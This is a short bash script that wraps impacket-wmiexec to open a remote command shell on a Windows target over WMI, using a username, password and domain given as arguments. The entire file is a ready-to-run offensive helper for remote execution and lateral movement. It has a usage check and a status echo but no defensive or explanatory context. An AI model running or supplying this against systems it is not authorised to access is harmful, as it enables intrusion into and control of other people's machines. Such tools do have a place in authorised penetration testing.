#!/bin/bash
# Get shell via WMI (requires valid creds)

TARGET="$1"
USER="$2"
PASS="$3"
DOMAIN="${4:-WORKGROUP}"

if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASS" ]; then
    echo "Usage: wmiexec_shell.sh <target> <user> <pass> [domain]"
    exit 1
fi

echo "[*] WMIExec to $TARGET as $DOMAIN\\$USER"

impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" 2>&1
